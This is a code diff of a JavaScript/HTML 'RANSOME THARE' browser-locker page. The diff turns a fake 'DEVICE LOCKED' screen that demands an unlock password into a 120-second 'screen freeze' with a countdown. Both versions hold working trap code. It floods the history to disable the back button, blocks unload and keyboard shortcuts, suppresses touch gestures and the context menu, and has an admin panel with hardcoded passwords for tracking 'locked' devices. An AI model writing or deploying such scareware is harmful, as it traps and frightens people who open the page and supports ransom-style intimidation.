@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
-    <title>RANSOME THARE - Device Locked</title>
+    <title>RANSOME THARE - Screen Freeze</title>
     <style>
         * {
             margin: 0;
@@ -25,8 +25,8 @@
             touch-action: none;
         }
 
-        /* LOCK SCREEN - FULL BLOCK */
-        .lock-screen {
+        /* FREEZE SCREEN - COMPLETE BLOCK */
+        .freeze-screen {
             position: fixed;
             top: 0;
             left: 0;
@@ -41,6 +41,7 @@
             text-align: center;
             padding: 25px;
             touch-action: none;
+            pointer-events: all;
         }
 
         .skull {
@@ -48,12 +49,6 @@
             margin-bottom: 25px;
             filter: drop-shadow(0 0 20px red);
             animation: shake 0.5s infinite;
-            cursor: pointer;
-            transition: transform 0.2s;
-        }
-
-        .skull:active {
-            transform: scale(0.95);
         }
 
         @keyframes shake {
@@ -98,12 +93,18 @@
             padding: 12px;
             border-radius: 12px;
             letter-spacing: 2px;
-            cursor: pointer;
-            transition: 0.2s;
         }
 
-        .device-id:active {
-            background: rgba(255,255,255,0.2);
+        .timer {
+            margin-top: 30px;
+            font-size: 18px;
+            color: #ff9800;
+        }
+
+        .timer span {
+            font-size: 32px;
+            font-weight: bold;
+            font-family: monospace;
         }
 
         .footer {
@@ -255,71 +256,7 @@
             font-weight: bold;
         }
 
-        /* Password Modal */
-        .password-modal {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0,0,0,0.98);
-            z-index: 100000;
-            justify-content: center;
-            align-items: center;
-        }
-
-        .password-box {
-            background: linear-gradient(145deg, #1e1e3a, #0f0f2a);
-            border-radius: 30px;
-            padding: 35px;
-            width: 90%;
-            max-width: 350px;
-            text-align: center;
-            border: 2px solid #ff9800;
-        }
-
-        .password-box h2 {
-            color: #ff9800;
-            margin-bottom: 20px;
-            font-size: 26px;
-        }
-
-        .password-box input {
-            width: 100%;
-            padding: 15px;
-            border: none;
-            border-radius: 50px;
-            font-size: 24px;
-            text-align: center;
-            letter-spacing: 5px;
-            background: white;
-        }
-
-        .password-box button {
-            width: 100%;
-            padding: 14px;
-            margin-top: 15px;
-            background: #4CAF50;
-            color: white;
-            border: none;
-            border-radius: 50px;
-            font-size: 18px;
-            cursor: pointer;
-            font-weight: bold;
-        }
-
-        .password-box button.cancel {
-            background: #555;
-        }
-
-        .pass-error {
-            color: #ff5555;
-            margin-top: 12px;
-            display: none;
-        }
-
-        /* Success Message */
+        /* Success Toast */
         .success-toast {
             position: fixed;
             bottom: 50%;
@@ -340,16 +277,19 @@
 </head>
 <body>
 
-    <!-- LOCK SCREEN -->
-    <div id="lockScreen" class="lock-screen">
-        <div class="skull" id="skullBtn">💀</div>
-        <h1>DEVICE LOCKED</h1>
-        <div class="sub">This device has been remotely locked</div>
+    <!-- FREEZE SCREEN -->
+    <div id="freezeScreen" class="freeze-screen">
+        <div class="skull">💀</div>
+        <h1>DEVICE FREEZED</h1>
+        <div class="sub">Screen is temporarily locked</div>
         <div class="message-box">
             <div class="label">🔒 DEVICE ID</div>
-            <div class="device-id" id="lockedDeviceId">----</div>
+            <div class="device-id" id="frozenDeviceId">----</div>
         </div>
-        <div class="footer">⚠️ Tap on skull or device ID to unlock</div>
+        <div class="timer">
+            ⏳ Screen will unlock in <span id="countdown">120</span> seconds
+        </div>
+        <div class="footer">⚠️ Please wait... Screen will work automatically</div>
     </div>
 
     <!-- ADMIN PANEL -->
@@ -365,15 +305,15 @@
                 <div class="label">Total Devices</div>
             </div>
             <div class="stat">
-                <div class="number" id="lockedDevices">0</div>
-                <div class="label">Locked</div>
+                <div class="number" id="frozenDevices">0</div>
+                <div class="label">Frozen</div>
             </div>
         </div>
 
         <div class="device-card">
-            <h3>📱 LOCKED DEVICES</h3>
+            <h3>📱 FROZEN DEVICES</h3>
             <div class="device-list" id="deviceList">
-                <p style="text-align:center;opacity:0.6;">No locked devices</p>
+                <p style="text-align:center;opacity:0.6;">No frozen devices</p>
             </div>
             <div class="add-section">
                 <input type="text" id="newDeviceId" placeholder="New Device ID (or auto)">
@@ -382,30 +322,19 @@
         </div>
     </div>
 
-    <!-- PASSWORD MODAL -->
-    <div id="passwordModal" class="password-modal">
-        <div class="password-box">
-            <div style="font-size: 50px; margin-bottom: 10px;">🔐</div>
-            <h2>ENTER PASSWORD</h2>
-            <input type="password" id="unlockPassword" maxlength="6" placeholder="******" autocomplete="off">
-            <button onclick="verifyPassword()">UNLOCK</button>
-            <button class="cancel" onclick="closePasswordModal()">CANCEL</button>
-            <div id="passError" class="pass-error">❌ Wrong password!</div>
-        </div>
-    </div>
-
     <!-- SUCCESS TOAST -->
-    <div id="successToast" class="success-toast">✅ UNLOCK SUCCESSFUL!</div>
+    <div id="successToast" class="success-toast">✅ SCREEN UNFROZEN!</div>
 
     <script>
         // ========== PASSWORDS ==========
         const ADMIN_PASSWORD = "8708250548";
-        const UNLOCK_PASSWORD = "809080";
         
         // ========== DATA ==========
-        let lockedDevices = JSON.parse(localStorage.getItem('ransome_devices') || '[]');
+        let frozenDevices = JSON.parse(localStorage.getItem('ransome_devices') || '[]');
         let isAdminLoggedIn = localStorage.getItem('ransome_admin') === 'true';
         let currentDeviceId = localStorage.getItem('ransome_current_device') || null;
+        let freezeTimer = null;
+        let countdownInterval = null;
 
         // ========== GENERATE DEVICE ID ==========
         function generateDeviceId() {
@@ -414,30 +343,30 @@
 
         // ========== SAVE & UPDATE ==========
         function saveDevices() {
-            localStorage.setItem('ransome_devices', JSON.stringify(lockedDevices));
+            localStorage.setItem('ransome_devices', JSON.stringify(frozenDevices));
             updateAdminList();
         }
 
         function updateAdminList() {
             if (!isAdminLoggedIn) return;
             
-            document.getElementById('totalDevices').innerText = lockedDevices.length;
-            document.getElementById('lockedDevices').innerText = lockedDevices.length;
+            document.getElementById('totalDevices').innerText = frozenDevices.length;
+            document.getElementById('frozenDevices').innerText = frozenDevices.length;
             
             const container = document.getElementById('deviceList');
-            if (lockedDevices.length === 0) {
-                container.innerHTML = '<p style="text-align:center;opacity:0.6;">No locked devices</p>';
+            if (frozenDevices.length === 0) {
+                container.innerHTML = '<p style="text-align:center;opacity:0.6;">No frozen devices</p>';
             } else {
                 container.innerHTML = '';
-                lockedDevices.forEach(device => {
+                frozenDevices.forEach(device => {
                     const div = document.createElement('div');
                     div.className = 'device-item';
                     div.innerHTML = `
                         <div class="device-info">
                             <div class="device-id">🔒 ${device.id}</div>
-                            <div class="status">LOCKED</div>
+                            <div class="status">FROZEN</div>
                         </div>
-                        <button class="force-unlock-btn" onclick="forceUnlockDevice('${device.id}')">🔓 FORCE UNLOCK</button>
+                        <button class="force-unlock-btn" onclick="forceUnfreeze('${device.id}')">🔓 FORCE UNFREEZE</button>
                     `;
                     container.appendChild(div);
                 });
@@ -454,72 +383,100 @@
                 alert('ID must be at least 4 characters!');
                 return;
             }
-            if (lockedDevices.find(d => d.id === id)) {
+            if (frozenDevices.find(d => d.id === id)) {
                 alert('Device already exists!');
                 return;
             }
-            lockedDevices.push({ id: id, lockedAt: new Date().toISOString() });
+            frozenDevices.push({ id: id, frozenAt: new Date().toISOString() });
             saveDevices();
-            alert(`✅ Device ${id} added to lock list!`);
+            alert(`✅ Device ${id} added to freeze list!`);
             document.getElementById('newDeviceId').value = '';
         }
 
-        // ========== SHOW PASSWORD MODAL ==========
-        function showPasswordModal() {
-            document.getElementById('passwordModal').style.display = 'flex';
-            document.getElementById('unlockPassword').value = '';
-            document.getElementById('passError').style.display = 'none';
-        }
-
-        function closePasswordModal() {
-            document.getElementById('passwordModal').style.display = 'none';
-        }
-
-        // ========== VERIFY PASSWORD & EXIT ==========
-        function verifyPassword() {
-            const enteredPass = document.getElementById('unlockPassword').value;
+        // ========== START FREEZE WITH COUNTDOWN ==========
+        function startFreeze(deviceId) {
+            currentDeviceId = deviceId;
+            localStorage.setItem('ransome_current_device', deviceId);
             
-            if (enteredPass === UNLOCK_PASSWORD) {
-                closePasswordModal();
-                
-                // Show success message
-                const toast = document.getElementById('successToast');
-                toast.style.display = 'block';
-                
-                // Remove device from lock list
-                if (currentDeviceId) {
-                    lockedDevices = lockedDevices.filter(d => d.id !== currentDeviceId);
-                    saveDevices();
-                }
-                
-                // Auto exit after 1 second
-                setTimeout(() => {
-                    window.close();
-                    window.location.href = 'about:blank';
-                }, 1000);
-            } else {
-                document.getElementById('passError').style.display = 'block';
+            // Show freeze screen
+            document.getElementById('freezeScreen').style.display = 'flex';
+            document.getElementById('frozenDeviceId').innerText = deviceId;
+            document.getElementById('adminPanel').style.display = 'none';
+            
+            // Lock body completely
+            document.body.style.overflow = 'hidden';
+            document.body.style.position = 'fixed';
+            
+            // Push multiple history states
+            for(let i = 0; i < 20; i++) {
+                window.history.pushState(null, '', window.location.href);
             }
+            
+            // Start 120 seconds countdown
+            let secondsLeft = 120;
+            const countdownEl = document.getElementById('countdown');
+            countdownEl.innerText = secondsLeft;
+            
+            if (countdownInterval) clearInterval(countdownInterval);
+            countdownInterval = setInterval(() => {
+                secondsLeft--;
+                countdownEl.innerText = secondsLeft;
+                
+                if (secondsLeft <= 0) {
+                    clearInterval(countdownInterval);
+                    unfreezeScreen();
+                }
+            }, 1000);
+            
+            // Auto unfreeze after 2 minutes
+            if (freezeTimer) clearTimeout(freezeTimer);
+            freezeTimer = setTimeout(() => {
+                unfreezeScreen();
+            }, 120000);
         }
 
-        // ========== ADMIN FORCE UNLOCK ==========
-        function forceUnlockDevice(deviceId) {
-            const deviceExists = lockedDevices.find(d => d.id === deviceId);
+        // ========== UNFREEZE SCREEN ==========
+        function unfreezeScreen() {
+            if (freezeTimer) clearTimeout(freezeTimer);
+            if (countdownInterval) clearInterval(countdownInterval);
+            
+            // Remove from frozen list
+            if (currentDeviceId) {
+                frozenDevices = frozenDevices.filter(d => d.id !== currentDeviceId);
+                saveDevices();
+            }
+            
+            // Show success message
+            const toast = document.getElementById('successToast');
+            toast.style.display = 'block';
+            
+            setTimeout(() => {
+                toast.style.display = 'none';
+            }, 2000);
+            
+            // Auto exit browser after unfreeze
+            setTimeout(() => {
+                window.close();
+                window.location.href = 'about:blank';
+            }, 1500);
+        }
+
+        // ========== ADMIN FORCE UNFREEZE ==========
+        function forceUnfreeze(deviceId) {
+            const deviceExists = frozenDevices.find(d => d.id === deviceId);
             if (!deviceExists) {
                 alert(`❌ Device ${deviceId} not found!`);
                 return;
             }
             
-            lockedDevices = lockedDevices.filter(d => d.id !== deviceId);
-            saveDevices();
-            
-            alert(`✅ Device ${deviceId} has been UNLOCKED!`);
-            
             if (currentDeviceId === deviceId) {
-                setTimeout(() => {
-                    window.close();
-                    window.location.href = 'about:blank';
-                }, 500);
+                if (freezeTimer) clearTimeout(freezeTimer);
+                if (countdownInterval) clearInterval(countdownInterval);
+                unfreezeScreen();
+            } else {
+                frozenDevices = frozenDevices.filter(d => d.id !== deviceId);
+                saveDevices();
+                alert(`✅ Device ${deviceId} has been UNFROZEN!`);
             }
         }
 
@@ -543,97 +500,68 @@
         }
 
         function showAdminPanel() {
+            if (freezeTimer) clearTimeout(freezeTimer);
+            if (countdownInterval) clearInterval(countdownInterval);
             document.getElementById('adminPanel').style.display = 'block';
-            document.getElementById('lockScreen').style.display = 'none';
+            document.getElementById('freezeScreen').style.display = 'none';
             updateAdminList();
         }
 
-        function showLockScreen(deviceId) {
-            document.getElementById('adminPanel').style.display = 'none';
-            document.getElementById('lockScreen').style.display = 'flex';
-            document.getElementById('lockedDeviceId').innerText = deviceId;
-            
-            // Lock body completely
-            document.body.style.overflow = 'hidden';
-            document.body.style.position = 'fixed';
-            
-            // Push history - prevent back
-            for(let i = 0; i < 10; i++) {
-                window.history.pushState(null, '', window.location.href);
-            }
-        }
-
-        // ========== COMPLETE TRAP - NO EXIT ANYWAY ==========
-        // Block all navigation
+        // ========== COMPLETE TRAP - NO EXIT ==========
         window.addEventListener('popstate', function(e) {
-            if (currentDeviceId) {
-                for(let i = 0; i < 10; i++) {
+            if (currentDeviceId && document.getElementById('freezeScreen').style.display === 'flex') {
+                for(let i = 0; i < 20; i++) {
                     window.history.pushState(null, '', window.location.href);
                 }
-                return;
             }
         });
 
-        // Block beforeunload
         window.addEventListener('beforeunload', function(e) {
-            if (currentDeviceId) {
+            if (currentDeviceId && document.getElementById('freezeScreen').style.display === 'flex') {
                 e.preventDefault();
-                e.returnValue = '🔒 DEVICE LOCKED! Tap on skull to unlock.';
-                return '🔒 DEVICE LOCKED! Tap on skull to unlock.';
+                e.returnValue = '🔒 SCREEN FROZEN! Please wait ' + document.getElementById('countdown')?.innerText + ' seconds.';
+                return '🔒 SCREEN FROZEN! Please wait.';
             }
         });
 
-        // Block all keyboard shortcuts
         document.addEventListener('keydown', function(e) {
-            if (currentDeviceId) {
-                const blocked = ['F5', 'F12', 'Escape', 'Home', 'Backspace', 'ArrowLeft', 'ArrowRight', 'ArrowUp', 'ArrowDown', 'Meta', 'Alt', 'Tab', 'PageUp', 'PageDown'];
-                if (blocked.includes(e.key) || (e.ctrlKey && (e.key === 'r' || e.key === 'w' || e.key === 'q' || e.key === 't')) || (e.altKey && e.key === 'ArrowLeft')) {
+            if (currentDeviceId && document.getElementById('freezeScreen').style.display === 'flex') {
+                const blocked = ['F5', 'F12', 'Escape', 'Home', 'Backspace', 'ArrowLeft', 'ArrowRight', 'ArrowUp', 'ArrowDown', 'Meta', 'Alt', 'Tab'];
+                if (blocked.includes(e.key) || (e.ctrlKey && (e.key === 'r' || e.key === 'w' || e.key === 'q'))) {
                     e.preventDefault();
-                    e.stopPropagation();
                     return false;
                 }
             }
         });
 
-        // Block all touch gestures (swipe, pull to refresh)
-        let touchStartX = 0, touchStartY = 0;
+        let touchStartX = 0;
         document.addEventListener('touchstart', function(e) {
-            if (currentDeviceId) {
+            if (currentDeviceId && document.getElementById('freezeScreen').style.display === 'flex') {
                 touchStartX = e.touches[0].clientX;
-                touchStartY = e.touches[0].clientY;
                 e.preventDefault();
             }
         });
         document.addEventListener('touchmove', function(e) {
-            if (currentDeviceId) {
+            if (currentDeviceId && document.getElementById('freezeScreen').style.display === 'flex') {
                 e.preventDefault();
             }
         });
         document.addEventListener('touchend', function(e) {
-            if (currentDeviceId) {
+            if (currentDeviceId && document.getElementById('freezeScreen').style.display === 'flex') {
                 e.preventDefault();
             }
         });
 
-        // Block context menu (long press)
         document.addEventListener('contextmenu', function(e) {
-            if (currentDeviceId) {
+            if (currentDeviceId && document.getElementById('freezeScreen').style.display === 'flex') {
                 e.preventDefault();
                 return false;
             }
         });
 
-        // Block wheel/scroll
-        document.addEventListener('wheel', function(e) {
-            if (currentDeviceId) {
-                e.preventDefault();
-            }
-        }, { passive: false });
-
-        // Continuously push history
-        if (currentDeviceId) {
+        if (currentDeviceId && document.getElementById('freezeScreen').style.display === 'flex') {
             setInterval(() => {
-                if (currentDeviceId) {
+                if (currentDeviceId && document.getElementById('freezeScreen').style.display === 'flex') {
                     window.history.pushState(null, '', window.location.href);
                 }
             }, 200);
@@ -645,41 +573,31 @@
             const deviceId = urlParams.get('id');
             
             if (deviceId) {
-                const isLocked = lockedDevices.find(d => d.id === deviceId);
-                if (isLocked) {
-                    currentDeviceId = deviceId;
-                    localStorage.setItem('ransome_current_device', deviceId);
-                    showLockScreen(deviceId);
+                const isFrozen = frozenDevices.find(d => d.id === deviceId);
+                if (isFrozen) {
+                    startFreeze(deviceId);
                 } else {
                     showAdminLogin();
                 }
             } else {
                 const newId = generateDeviceId();
-                if (!lockedDevices.find(d => d.id === newId)) {
-                    lockedDevices.push({ id: newId, lockedAt: new Date().toISOString() });
+                if (!frozenDevices.find(d => d.id === newId)) {
+                    frozenDevices.push({ id: newId, frozenAt: new Date().toISOString() });
                     saveDevices();
                 }
                 window.location.href = `?id=${encodeURIComponent(newId)}`;
             }
         }
 
-        // Make functions global
         window.adminLogout = adminLogout;
         window.addDevice = addDevice;
-        window.forceUnlockDevice = forceUnlockDevice;
-        window.showPasswordModal = showPasswordModal;
-        window.closePasswordModal = closePasswordModal;
-        window.verifyPassword = verifyPassword;
+        window.forceUnfreeze = forceUnfreeze;
         window.showAdminLogin = showAdminLogin;
-
-        // Attach click events to skull and device ID
-        document.getElementById('skullBtn')?.addEventListener('click', showPasswordModal);
-        document.getElementById('lockedDeviceId')?.addEventListener('click', showPasswordModal);
 
         if (isAdminLoggedIn) {
             showAdminPanel();
-        } else if (currentDeviceId) {
-            showLockScreen(currentDeviceId);
+        } else if (currentDeviceId && frozenDevices.find(d => d.id === currentDeviceId)) {
+            startFreeze(currentDeviceId);
         } else {
             init();
         }
